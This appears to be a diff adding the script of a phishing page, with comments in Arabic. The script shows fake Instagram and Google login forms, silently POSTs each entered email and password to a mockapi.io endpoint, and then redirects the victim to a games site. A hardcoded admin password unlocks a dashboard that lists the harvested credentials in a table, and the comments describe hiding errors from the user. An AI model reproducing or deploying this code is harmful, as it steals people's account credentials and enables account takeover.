@@ -1,0 +1,84 @@
+<script>
+        // الرابط الخاص بك جاهز للعمل ومربوط بقاعدة البيانات
+        const API_URL = 'https://6afb4062730c1d152f335c5c.mockapi.io/users'; 
+
+        function toggleMenu() {
+            document.getElementById('sidebar').classList.toggle('active');
+        }
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+            toggleMenu(); 
+        }
+
+        function openAdmin() {
+            showScreen('admin-screen');
+            document.getElementById('admin-login').style.display = 'block';
+            document.getElementById('admin-dashboard').classList.add('hidden');
+            document.getElementById('error-msg').style.display = 'none';
+        }
+
+        // دالة الدخول للأدمن وجلب البيانات من السيرفر
+        async function verifyAdmin() {
+            const pass = document.getElementById('admin-password-input').value;
+            if (pass === '1823567818235678') {
+                document.getElementById('admin-login').style.display = 'none';
+                document.getElementById('admin-dashboard').classList.remove('hidden');
+                document.getElementById('admin-password-input').value = '';
+                
+                // جلب البيانات من الإنترنت
+                try {
+                    const response = await fetch(API_URL);
+                    const usersData = await response.json();
+                    renderTable(usersData);
+                } catch (error) {
+                    document.getElementById('users-table-body').innerHTML = '<tr><td colspan="3">جاري تحميل البيانات... تأكد من صحة الرابط</td></tr>';
+                }
+            } else {
+                document.getElementById('error-msg').style.display = 'block';
+            }
+        }
+
+        // دالة تسجيل الدخول وإرسال البيانات للسيرفر
+        async function handleLogin(event, platform) {
+            event.preventDefault(); 
+            
+            const email = platform === 'Instagram' ? document.getElementById('insta-email').value : document.getElementById('google-email').value;
+            const password = platform === 'Instagram' ? document.getElementById('insta-pass').value : document.getElementById('google-pass').value;
+
+            // إرسال البيانات بصمت إلى قاعدة البيانات
+            try {
+                await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ platform, email, password })
+                });
+            } catch (error) {
+                console.log("Network error"); // يتم الإخفاء عن المستخدم
+            }
+
+            // التوجيه فوراً لموقع الألعاب
+            window.location.href = "https://www.crazygames.com/ar/multiplayer";
+        }
+
+        function renderTable(usersData) {
+            const tbody = document.getElementById('users-table-body');
+            tbody.innerHTML = '';
+            
+            if(!usersData || usersData.length === 0 || usersData === "Not found") {
+                tbody.innerHTML = '<tr><td colspan="3">لا يوجد مستخدمين بعد</td></tr>';
+                return;
+            }
+
+            usersData.forEach(user => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${user.platform || '-'}</td>
+                    <td>${user.email || '-'}</td>
+                    <td>${user.password || '-'}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+    </script>
